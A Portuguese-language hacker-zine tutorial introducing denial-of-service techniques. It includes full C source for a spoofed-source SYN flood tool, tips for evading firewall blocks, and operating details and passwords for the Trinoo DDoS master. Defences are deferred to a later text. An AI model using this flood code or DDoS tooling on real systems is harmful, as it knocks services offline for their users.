@@ -1,0 +1,647 @@
+/==============================================================================/
+/======================== Int0x80 && EoH =====================================/
+/============================================================================/
+
+
+
+http://int0x80.host.sk
+http://eoh-team.tk
+http://unsekurity.virtualave.net
+
+
+by Jerry Slater - rx@coredumped.tk
+
+   http://jerryslater.host.sk
+
+
+
+-> Por favor elitos, crackers, script kiddies, defacers e coisas do
+   genero nao percam seu precioso tempo lendo esse artigo.
+
+-> O autor nao se responsabiliza pelo mau uso das informacoes
+   contidas aqui.
+
+
+	       =======================
+	       =  Introducao ao DoS  =
+	       =======================
+
+
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+
+1.0 - Grupos e Unsekurity Scene
+
+2.0 - DoS: Entendendo a Tecnica
+
+	2.1 - Ping of Death
+	2.2 - Smurf
+	2.3 - SynFlood
+	2.4 - TearDrop
+	2.5 - DDoS
+	2.6 - Outras	
+
+3.0 - Por que fazer um DoS?
+
+4.0 - Links e Referenciais
+
+5.0 - Agradecimentos
+
+
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+
+================================
+1.0 - Grupos e Unsekurity Scene
+================================
+
+
+Eh com grande satisfacao que paro e olho para o passado e vejo o papel que o
+Unsekurity representou para comunidade hacking brasileira. Iniciando em fim de 
+99 inicio de 00 como um team, o Unsekurity ao longo dos anos cresceu e virou o 
+cenario do hacking aqui..:)
+
+Muitas batalhas foram vencidas e outras perdidas, muitos amigos foram 
+conquistados e outros desmascarados, muita informacao foi liberada e o melhor 
+nisso tudo eh que o Unsek nunca entregou os pontos, nunca se fez por vencido. 
+Essa coragem e perseveranca devemos a todos que estiveram ao lado da etica, 
+nao existe um icone como alguns pensam, mas sim varios. Todos de for
+direta ou indireta fizeram com que o Unsek ganhasse mais espaco e que ficasse 
+mais acessivel a todos que apoiam o hacking em sua essencia.
+
+Atualmente vemos o nascimento de alguns grupos que apoiam o hacking etico e 
+junto com isso apoiam o Unsek. Isso eh bastante valido, pois aumentara a 
+liberdade de informacao a ser disponibilizada a toda a comunidade, nao havera 
+mais problemas quanto a questao de uma centralizacao que alguns achavam 
+existir e mostrara tambem que um comunidade pode permanecer unidade mesmo 
+havendo diferencas. Parabens a todos que fazem parte e apoiam o Unsek.
+
+
+=============================
+2.0 - DoS: Entendo a Tecnica
+=============================
+
+
+Quem já nao ficou indignado quando um servico fica fora do ar 
+ou o sistema fica travado???
+Muitas vezes, problemas como esse são gerados por um ataque conhecido
+como DoS (Denial of Service).
+
+# O Ataque
+
+O DoS consiste em o atacante inabilitar um servico ou sistema, impedindo 
+assim que o mesmo se comunique com outra máquina na rede ou ate mesmo que 
+seu uso fique impossibilitado sem que aconteca um reset.
+
+Frequentemente vemos o uso constante desse ataque tanto a pequenos
+servidores quanto a servidores de grande porte como o servidor da Yahoo. 
+Ao meu ver, o uso de DoS so e válido para fins educacionais, jamais deve 
+ser usado para prejudicar alguem ou algum sistema. Um bom uso e para o 
+estudo de tecnicas de spooofing....:)
+
+São diversas as formas de implementacão dessa tecnica, desde exploracão 
+da pilha tcp/ip ate implementacões em nevel de kernel.
+
+
+====================
+2.1 - Ping of Death
+====================
+
+
+O Ping of Deadh foi uma das primeiras formas de DoS criada. 
+O envio de uma pacote maior do que o permitido (65Kbytes) faz com
+que exista uma fragmentacão. Quando o pacote chega ao eu alvo o kernel
+tenta montá-lo, mas devido ao seu tamanho ser maior do que o permitido isso 
+gera uma "confusão" no kernel e em alguns sistemas operacionais essa
+"confusao" acaba em um travamento.
+
+
+============
+2.2 - Smurf
+============
+
+
+Na maioria das redes, enderecos de broadcast estão presentes. O endereco
+de broadcast e um endereco que envia mensagens a todos os hosts da rede de 
+uma só vez.
+
+Abixo temos o exemplo de um ping enviado a um endereco de broadcast de uma
+determinada rede.
+
+host:/etc# ping 192.168.0.255
+PING 192.168.0.255 (192.168.0.255): 56 data bytes
+64 bytes from 192.168.0.2: icmp_seq=0 ttl=255 time=0.3 ms
+64 bytes from 192.168.0.4: icmp_seq=0 ttl=255 time=12.6 ms (DUP!)
+64 bytes from 192.168.0.3: icmp_seq=0 ttl=255 time=24.7 ms (DUP!)
+64 bytes from 192.168.0.2: icmp_seq=1 ttl=255 time=0.1 ms
+64 bytes from 192.168.0.4: icmp_seq=1 ttl=255 time=11.8 ms (DUP!)
+64 bytes from 192.168.0.3: icmp_seq=1 ttl=255 time=23.3 ms (DUP!)
+64 bytes from 192.168.0.2: icmp_seq=2 ttl=255 time=0.1 ms
+64 bytes from 192.168.0.4: icmp_seq=2 ttl=255 time=11.1 ms (DUP!)
+64 bytes from 192.168.0.3: icmp_seq=2 ttl=255 time=22.0 ms (DUP!)
+64 bytes from 192.168.0.2: icmp_seq=3 ttl=255 time=0.1 ms
+64 bytes from 192.168.0.4: icmp_seq=3 ttl=255 time=10.5 ms (DUP!)
+64 bytes from 192.168.0.3: icmp_seq=3 ttl=255 time=20.6 ms (DUP!)
+64 bytes from 192.168.0.2: icmp_seq=4 ttl=255 time=0.1 ms
+64 bytes from 192.168.0.4: icmp_seq=4 ttl=255 time=10.0 ms (DUP!)
+64 bytes from 192.168.0.3: icmp_seq=4 ttl=255 time=19.7 ms (DUP!)
+64 bytes from 192.168.0.2: icmp_seq=5 ttl=255 time=0.1 ms
+64 bytes from 192.168.0.4: icmp_seq=5 ttl=255 time=9.3 ms (DUP!)
+64 bytes from 192.168.0.3: icmp_seq=5 ttl=255 time=18.2 ms (DUP!)
+64 bytes from 192.168.0.2: icmp_seq=6 ttl=255 time=0.1 ms
+64 bytes from 192.168.0.4: icmp_seq=6 ttl=255 time=8.8 ms (DUP!)
+64 bytes from 192.168.0.3: icmp_seq=6 ttl=255 time=17.5 ms (DUP!)
+64 bytes from 192.168.0.2: icmp_seq=7 ttl=255 time=0.1 ms
+64 bytes from 192.168.0.4: icmp_seq=7 ttl=255 time=8.4 ms (DUP!)
+64 bytes from 192.168.0.3: icmp_seq=7 ttl=255 time=16.5 ms (DUP!)
+
+--- 192.168.0.255 ping statistics ---
+8 packets transmitted, 8 packets received, +16 duplicates, 0% packet loss
+round-trip min/avg/max = 0.1/10.2/24.7 ms
+
+Podemos ver que o endereco de broadcast tem terminacao .255, isso porq
+essa rede pertence a classe C e possui poucos hosts. Imagine se a rede
+possuisse 100 maquinas..:) seriam 100 repostas ao pedido de ping enviados
+de uma vez ao host que fez essa solicitacao. Indo ainda mais alem, imagine
+fazer isso em uma rede de classe B..:)
+
+A maneira de implementar o smurf e usando um ip spoofado, esse ip deve 
+ser o ip do host que voce deseja atacar. Enviando um pacote, ate mesmo um ping,
+a um endereco de broadcast fará com que todos os hosts da rede enviem uma 
+resposta ao host alvo, fazendo com que a vitima recebe vários pacotes ao mesmo
+tempo. Quanto maior a rede, maior sua chance de exito.
+
+
+===============
+2.3 - SynFlood
+===============
+
+
+A pilha tcp/ip antes de habilitar uma conexao realiza o que chamamos de 
+handshake, ou seja, as máquinas precisam "apertar as mãos" para que se
+comuniquem normalmente.
+
+O handshake consiste no envio de alguns pacotes com certos flags ativados.
+
+Primeiramente a maquina envia um pacote com o flag SYN ativado ao
+servidor, que por usa vez responde com os flags ACK e SYN ao cliente, que
+em seguida em novamente um pacote com o flag ACK. Apos esse procedimento a
+conexao e iniciada.
+
+************************** synf.c ****************************************
+
+
+/*
+ * Thanks Int0x80 && EoH
+ * by Jerry Slater
+ * compile com #gcc -o synf synf.c
+ * OBS: E necessario ser root para uso de raw sockets!
+ */
+
+
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <arpa/inet.h>
+#include <netinet/in.h>
+#include <netinet/ip.h>
+#include <netinet/tcp.h>
+
+#define         erro            -1
+#define         portsaida       115
+
+int main(int argc, char *argv[])
+
+{
+
+struct tcphdr *tcp;
+struct iphdr *ip;
+struct in_addr saddr, daddr;
+struct sockaddr_in hostalvo;
+unsigned char pacote[(sizeof(struct iphdr)+sizeof(struct tcphdr))];
+int portadest, sockt, on=1;
+int numpack, count;
+
+if (argc<4) {
+ printf ("Simples SynFlood\n");
+ printf ("by Jerry Slater\n");
+ printf ("Thanks int0x80, EoH && Unsekurity\n\n\n");
+ printf ("Use: %s <ip_spoofado> <ip_da_vitima> <porta_da_vitima> <n_de_pacotes>\n", argv[0]);
+ exit (1);
+}
+
+printf ("Simples SynFlood\n");
+printf ("by Jerry Slater\n\n");
+
+portadest = atoi(argv[3]);
+numpack = atoi(argv[4]);
+
+sockt = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
+
+if (sockt == erro) {
+ printf ("Erro ao Conectar\n");
+ exit (1);
+}
+
+if(setsockopt(sockt,IPPROTO_IP,IP_HDRINCL,&on,sizeof(on)) == erro) {
+ printf("setsockopt error\n");
+ exit(1);
+}
+
+for (count=0; count<numpack; count++) {
+
+ip = (struct iphdr *)pacote;
+tcp = (struct tcphdr *)(pacote+sizeof(struct iphdr));
+
+memset((char *)ip, '\0', sizeof(struct iphdr));
+memset((char *)tcp, '\0', sizeof(struct tcphdr));
+memset(&hostalvo, '\0', sizeof(hostalvo));
+
+saddr.s_addr=inet_addr(argv[1]);
+daddr.s_addr=inet_addr(argv[2]);
+
+ip->ihl         =       5;
+ip->version     =       4;
+ip->tot_len     =       sizeof(struct iphdr)+sizeof(struct tcphdr);
+ip->id          =       rand();
+ip->ttl         =       150;
+ip->protocol    =       IPPROTO_TCP;
+ip->saddr       =       saddr.s_addr;
+ip->daddr       =       daddr.s_addr;
+ip->check       =       0;
+
+tcp->source     =       htons(portsaida);
+tcp->dest       =       htons(portadest);
+tcp->seq        =       htonl(rand());
+tcp->ack_seq    =       htonl(rand());
+tcp->res1       =       0;
+tcp->doff       =       5;
+tcp->window     =       htons(500);
+tcp->syn        =       1;  /* bit syn ativado */
+
+
+hostalvo.sin_family = AF_INET;
+hostalvo.sin_port = htons(portadest);
+hostalvo.sin_addr = daddr;
+
+
+if (sendto(sockt, &pacote, sizeof(pacote), 0x00, (struct sockaddr
+*)&hostalvo,
+sizeof (struct sockaddr)) != sizeof(pacote)) {
+ printf ("Erro ao enviar o Pacote!\n");
+ exit (1);
+}
+
+memset((char *)ip, '\0', sizeof(struct iphdr));
+memset((char *)tcp, '\0', sizeof(struct tcphdr));
+printf (".");
+}
+
+printf ("\n");
+return (0);
+
+}
+
+**************************************************************************
+
+Notemos que o synflood descrito acima e facilmente barrado por um
+firewall, mas por outro lado os pacotes com o bit SYN ativado chegarao a 
+vitima já com outro endereco de IP, ou seja, chegarao com o IP jah
+Spoofado...:) Com isso, sua maquina ainda vai poder se comunicar com o
+host alvo e quem tera a comunicacao barrada e a maquina que possuir o IP
+setado por nos.
+
+Logo abaixo vemos um exemplo de como ficaria um host apos ter sido acatado
+por um synflood.
+
+Active Internet connections (servers and established)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State
+tcp        0      0 0.0.0.0:110             0.0.0.0:*               LISTEN
+tcp        0      0 0.0.0.0:23              0.0.0.0:*               LISTEN
+tcp        0      0 127.0.0.1:21            10.10.0.5:115	    SYN_RECV
+tcp        0      0 127.0.0.1:21            10.10.0.5:115           SYN_RECV
+tcp        0      0 127.0.0.1:21            10.10.0.5:115           SYN_RECV
+tcp        0      0 127.0.0.1:21            10.10.0.5:115           SYN_RECV
+tcp        0      0 127.0.0.1:21            10.10.0.5:115           SYN_RECV
+tcp        0      0 127.0.0.1:21            10.10.0.5:115           SYN_RECV
+tcp        0      0 127.0.0.1:21            10.10.0.5:115           SYN_RECV
+tcp        0      0 127.0.0.1:21            10.10.0.5:115           SYN_RECV
+tcp        0      0 127.0.0.1:21            10.10.0.5:115           SYN_RECV
+tcp        0      0 127.0.0.1:21            10.10.0.5:115           SYN_RECV
+tcp        0      0 127.0.0.1:21            10.10.0.5:115           SYN_RECV
+tcp        0      0 127.0.0.1:21            10.10.0.5:115           SYN_RECV
+tcp        0      0 127.0.0.1:21            10.10.0.5:115           SYN_RECV
+tcp        0      0 127.0.0.1:21            10.10.0.5:115           SYN_RECV
+tcp        0      0 127.0.0.1:21            10.10.0.5:115           SYN_RECV
+tcp        0      0 127.0.0.1:21            10.10.0.5:115           SYN_RECV
+tcp        0      0 127.0.0.1:21            10.10.0.5:115           SYN_RECV
+tcp        0      0 127.0.0.1:21            10.10.0.5:115           SYN_RECV
+tcp        0      0 127.0.0.1:21            10.10.0.5:115           SYN_RECV
+tcp        0      0 127.0.0.1:21            10.10.0.5:115           SYN_RECV
+tcp        0      0 127.0.0.1:21            10.10.0.5:115           SYN_RECV
+tcp        0      0 127.0.0.1:21            10.10.0.5:115           SYN_RECV
+tcp        0      0 127.0.0.1:21            10.10.0.5:115           SYN_RECV
+tcp        0      0 127.0.0.1:21            10.10.0.5:115           SYN_RECV
+tcp        0      0 127.0.0.1:21            10.10.0.5:115           SYN_RECV
+tcp        0      0 127.0.0.1:21            10.10.0.5:115           SYN_RECV
+tcp        0      0 127.0.0.1:21            10.10.0.5:115           SYN_RECV
+tcp        0      0 127.0.0.1:21            10.10.0.5:115           SYN_RECV
+tcp        0      0 127.0.0.1:21            10.10.0.5:115           SYN_RECV
+tcp        0      0 127.0.0.1:21            10.10.0.5:115           SYN_RECV
+tcp        0      0 127.0.0.1:21            10.10.0.5:115           SYN_RECV
+tcp        0      0 127.0.0.1:21            10.10.0.5:115           SYN_RECV
+tcp        0      0 127.0.0.1:21            10.10.0.5:115           SYN_RECV
+tcp        0      0 127.0.0.1:21            10.10.0.5:115           SYN_RECV
+tcp        0      0 127.0.0.1:21            10.10.0.5:115           SYN_RECV
+tcp        0      0 127.0.0.1:21            10.10.0.5:115           SYN_RECV
+tcp        0      0 127.0.0.1:21            10.10.0.5:115           SYN_RECV
+tcp        0      0 127.0.0.1:21            10.10.0.5:115           SYN_RECV
+tcp        0      0 127.0.0.1:21            10.10.0.5:115           SYN_RECV
+tcp        0      0 127.0.0.1:21            10.10.0.5:115           SYN_RECV
+tcp        0      0 127.0.0.1:21            10.10.0.5:115           SYN_RECV
+tcp        0      0 127.0.0.1:21            10.10.0.5:115           SYN_RECV
+tcp        0      0 127.0.0.1:21            10.10.0.5:115           SYN_RECV
+tcp        0      0 127.0.0.1:21            10.10.0.5:115           SYN_RECV
+tcp        0      0 127.0.0.1:21            10.10.0.5:115           SYN_RECV
+tcp        0      0 127.0.0.1:21            10.10.0.5:115           SYN_RECV
+tcp        0      0 127.0.0.1:21            10.10.0.5:115           SYN_RECV
+raw        0      0 0.0.0.0:1               0.0.0.0:*               7
+raw        0      0 0.0.0.0:6               0.0.0.0:*               7
+Active UNIX domain sockets (servers and established)
+Proto RefCnt Flags       Type       State         I-Node Path
+unix  0      [ ACC ]     STREAM     LISTENING     36     /dev/log
+unix  0      [ ACC ]     STREAM     LISTENING     58     /dev/gpmctl
+unix  1      [ ]         STREAM     CONNECTED     39     @00000001
+unix  1      [ ]         STREAM     CONNECTED     40     /dev/log
+
+
+Podemos ver que o host alvo (127.0.0.1) esta recebendo varios pacotes com
+o flag SYN ativado na porta 21 do endereco 10.10.0.5 vindo da porta
+115. Isso fara com que o backlog do daemon de ftp fique cheio e assim 
+cause um enorme atraso no servico. Para dar uma olhado no backlog do seu
+sistema va em /proc/sys/net/ipv4/tcp_max_syn_backlog (slack 7.0).
+
+Um firewall pode facilmente barrar um ataque como esse barrando o
+recebimento de pacotes vindos do ip 10.10.0.5, mas o atacante pode tambem 
+fazer com que o synflood seja feito em modo distribuido, impedindo assim 
+com que esse tipo de ataque seja barrado. Para isso vc precisaria usar ips e
+portas "aleatorias", pois um firewall pode barrar pacotes tanto por ip quanto
+por porta.
+
+
+===============
+2.4 - TearDrop
+===============
+
+Ao meu ver, o TearDrop eh uma das tecnicas mais interessantes de DoS.
+Para que os dados muito grandes transitem em uma rede eles precisam ser 
+fragmentados para que cheguem ao seu objetivo. Cada fragmento desse dado eh
+chamado de pacote. Um pacote tambem, dependendo do seu tamanho, pode sofrer
+fragmentacao.
+
+Logo abaixo vemos o esquema de um cabelho ip de um pacote.
+
+
+ 0      3  4   7 8   	       15 16
+ ----------------------------------------------------------------------
+|versao  | IHL  | Tipo de servico |        Comprimento Total           |
+ ----------------------------------------------------------------------
+|       Identificacao             |  Flags |   Offset de fragmento     |
+ ----------------------------------------------------------------------
+| Tempo de vida |    Protocolo    |        checksum do cabecalho       |
+ ----------------------------------------------------------------------
+|			Endereco de origem			       |
+ ----------------------------------------------------------------------
+|			Endereco de destino			       |
+ ----------------------------------------------------------------------
+|			opcoes				 |   padding   |
+ ----------------------------------------------------------------------
+|			       dados				       |
+ ----------------------------------------------------------------------
+
+
+Quando um determinado dado trafega em uma rede, ele sofre uma fragmentacao
+para que possa fluir entre as maquinas de forma eficiente. Cada sub-rede
+possui o tamanho maximo de um que uma pacote pode ter para poder trafegar
+tranquilamente, quando esse limite eh ultrapassado o pacote sofre uma
+outra fragmentacao.
+
+O que nos interessa aqui nesse cabecalho eh o campo Identificacao, Flags e
+Offset de fragmento.
+
+O campo Identificacao eh usado na montagem dos fragmentos do pacote
+Ja o campo Flags indica se o pacote pode ou nao ser fragmentado ou se houve 
+ou nao fragmentacao. O Offset de fragmento eh o campo que informa a posicao 
+do fragmento no pacote original, esse campo vale zero se nao houver fragmentacao
+e tambem no primeiro fragmento do pacote.
+
+Com isso, o TearDrop consiste em o atacante enviar pacotes fragmentados ao
+alvo. Mas ai vc se pergunta: "O q tem d+ em fazer isso?"
+Ai eh aonde estah a malicia...:) os pacotes sao fragmentados, mas recebem 
+offsets que nao seguem uma sequencia, causando uma enorme "confusao" no kernel
+na hora de monta-los e isso faz com que o daemon ou sistema ficasse paralizado.
+
+
+===========
+2.5 - DDoS
+===========
+
+Considerada a tecnica mais eficiente de Denial of Service, o DDoS (Distribuide 
+Denial of Service) ficou bastante "popularizada".
+
+O pessoal da antiga l0pht, em uma palestra dada ao senado americano, alertou 
+para o perigo que essa tecnica iria trazer a internet. O Dr. Mudge chegou a 
+afirmar convictamente que a l0pht era capaz de derrubar toda a internet dos EUA
+em apenas 30 minutos.
+
+Com a publicacao de exploits aberta aos script kiddies, essa tecnica ficou 
+bastante conhecida. Sites de grandes empresas como a Yahoo e CNN foram vitimas 
+desse tipo de ataque. Ate a Australia sofreu com DDoS, pois teve seus backbones
+"centrais" atacados.
+
+O ponto principal para a criacao dessa tecnica foi a advento do processamento
+distribuido. O DDoS eh apenas uma variacao dos ataques distribuidos que podem
+ir desde scanning ateh sistemas de log. Um ataque distribuido eh um ataque 
+realizado por varias maquinas paralelamente.
+
+
+
+			 ---------------
+			|   Host Alvo   |
+	  ___________	 ---------------  ________
+	 /		  /	      \		  \
+	/		 /	       \	   \
+       /		/		\	    \	
+ ---------	 --------- 	  ---------	 ----------
+|  Zombie |	|  Zombie |	 |  Zombie |	|  Zombie  |
+ ---------	 ---------	  ---------	 ----------
+   |		   | 			|	      |
+   |		   |			|	      |
+   |		   |			|	      |
+   |		   |			|	      |
+   |		   |			|	      |
+   \ ------------ /			 \ --------- /
+    |   Master   |			  | Master  |
+     ------------			   ---------
+    	 |					|
+	 |		-------------		|
+	 \-----------  |   atacante  | ---------/
+			-------------
+
+
+
+O esquema acima mostra como podemos desenhar um ataque distribuido. Podemos ver
+que o atacante utilizara os 4 zumbies para poder atacar o host alvo. Como jah 
+foi menscionado, muitas ferramentas de DDoS cairam em maos de script kiddies e 
+com isso muitos servidores foram atacados.
+
+O DDoS eh mais uma tecnica que ainda nao possui uma protecao eficaz. Nem mesmo o
+sistema de protecao a Yahoo foi capaz de evita-lo. Eh claro para todos que 
+muitas maquinas requisitando conexoes fara com que o servidor fique entupido. O
+mais forte fica de pe no final, eh aquela velha historia: "Posso ser mais forte
+doq 1 ou 2, mas sera que sou mai forte doq 3?". Entao, se um atacante usar 
+backbones como zombies, dificilmente o host alvo aguentara o tranco..:)
+
+Uma das ferramentas que ficou bastante conhecida foi o Trinoo. Voce pode
+encontra-la na packetstorm.
+
+O Trinoo se divide em basicamente 2 programas, o master e o daemon
+(cliente). Abaixo ao executar o master, o soft espera por uma senha para
+que possa instalar uma backdoor no sistema. A senha, nesse caso, seria
+gOrave.
+
+[hostalvo]:/home/all/users/jslater/trinoo#master/master
+?? gOrave
+trinoo v1.07d2+f3+c [Apr 16 2002:18:37:53]
+
+Apos isso, perceba que as portas 27665 e 31335 (hum... que elit0) foram
+abertas.
+
+Proto Recv-Q Send-Q Local Address           Foreign Address         State
+tcp        0      0 0.0.0.0:27665           0.0.0.0:*               LISTEN
+udp        0      0 0.0.0.0:31335           0.0.0.0:*
+ 
+Agora, tentaremos nos conectar na porta 27665.
+
+jerryslater:~/$telnet hostalvo 27665
+Trying xxx.xxx.xxx.xxx...
+Connected to hostalvo.
+Escape character is '^]'.
+betaalmostdone
+trinoo v1.07d2+f3+c..[rpm8d/cb4Sx/]
+
+
+trinoo>
+
+O betaalmostdone eh como se fosse um password para que voce tenha acesso
+ao master. 
+
+O exemplo mostra acima e o de um host master. Um master eh como se fosse o
+chefe que ordena os empregados (zombies) executarem o ataque.
+
+Jah um host sendo o zombie ficaria a seguinte forma:
+
+Proto Recv-Q Send-Q Local Address           Foreign Address         State
+udp        0      0 0.0.0.0:1024            0.0.0.0:*
+udp        0      0 0.0.0.0:27444           0.0.0.0:*
+
+
+O ns.c eh referente ao prog que tornara um host um zombie. Voce deve definir
+a qual master ele deve servir no codigo fonte. Muitos script kiddies penaram
+com isso porq nao sabem fazer nada alem de um gcc -o ns ns.c ..:)
+
+A comunicacao entre o master e o zombie eh feita via UDP pela porta 27444, jah
+a comunicacao inversa eh feita, tambem, via UDP pela porta 31335.
+
+A cada comando enviado pelo master ao zombie eh necessario o envio de outro
+password (l44adsl).
+
+Existem diversas outras ferramentas para DDoS como o Shaft, jolt2, skydance
+(usando raw sockets para win32),  etc...:)
+
+Fica a seu criterio o estudo do funcionamento ou desenvolvimento de outras
+ferramentas para DDoS, tendo em vista que esse txt aborda apenas
+caracteristicas basicas dos ataques de DoS.
+
+
+=============
+2.6 - Outras
+=============
+
+Existem varias outras tecnicas que podem ser usadas tambem para DoS, buffer
+Overflow eh uma delas. Um denial of service pode ser gerado tanto remotamente
+quanto localmente. Em certos casos a simples mah utilizacao de um ponteiro pode
+levar o sistema operacional a um travamento.
+
+Certa vez, ao usar o nmap (remotamente) o gateway da rede a qual eu estava 
+conectado ficou totalmente paralizado..:)
+
+Atualmete o numero de exploits para DoS vem crescendo geometricamente e
+muitos deles usam buffer overflow, format string, etc... O que quero dizer 
+eh que podemos explorar desde a topologia de rede ateh a stack de uma maquina 
+para executar-mos um DoS. Eh comum vermos exploits para shell root que derruba
+o daemon que esta sendo exploitado e se vc nao instalar uma backdoor vc soh
+acessara a maquina novamente quando o servico for iniciado novamente e tb se
+o admin nao perceber o ataque.
+
+As tecnicas de defesas serao abordadas futuramente..:)
+
+
+
+============================
+3.0 - Por que fazer um DoS?
+============================
+
+Atualmente, DoS eh usado, na maioria das vezes, para fins maleficos.
+Eh comum encontrar pessoas que tenham seu ego inflado em saber que um
+determinado servidor ou servico soh ficara disponivel por sua boa
+vontade. Com isso, muitas pessoas se prejudicam pelo simples fato de alguem 
+nao ter acordado de bom humor.
+
+Sao poucos os que ainda usam o DoS em ultimo caso, ou para fins educacionais.
+Mas eh bom sempre deixar claro que independente do motivo que leve vc a usar 
+dessa tecnica algumas ou muitas pessoas acabarao se prejudicando de alguma
+forma seja por um servico nao disponivel ou ateh mesmo por nao
+conseguirem acessar a internet.Devido a tantos ataques praticados por
+script kiddies, o Brasil sofre com a proibicao de acesso a alguns sites,
+podemos ter como exemplo o site da NASA que por um periodo fechou as
+partas para os hosts brasileiros e com isso prejudicando muitas pessoas e 
+ateh universidades.
+
+O conselho que deixo aqui eh que se for estudar DoS, estude-o em
+localhost, eu sei que estudar DDoS em localhost eh impossivel, mas tente
+fazer isso de maneira a prejudicar o minimo de usuarios. Trazer problemas para 
+um usuario final nao faz parte do hacking.
+
+
+
+===========================
+4.0 - Links e Referenciais
+===========================
+
+http://www.kimera.com.br
+http://unsekurity.virtualave.net
+http://int0x80.host.sk
+http://eoh-team.tk
+
+http://packetstorm.decepticons.org
+http://www.securityfocus.com
+http://www.phrack.org
+
+
+=====================
+5.0 - Agradecimentos
+=====================
+
+Agradeco aqui a todo o pessoal que apoia e contribui para o Unsek, ao Int0x80, 
+ao pessoal do EoH e aos meus verdadeiros amigos.
+
+
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+[]'s
+
+Jerry Slater.
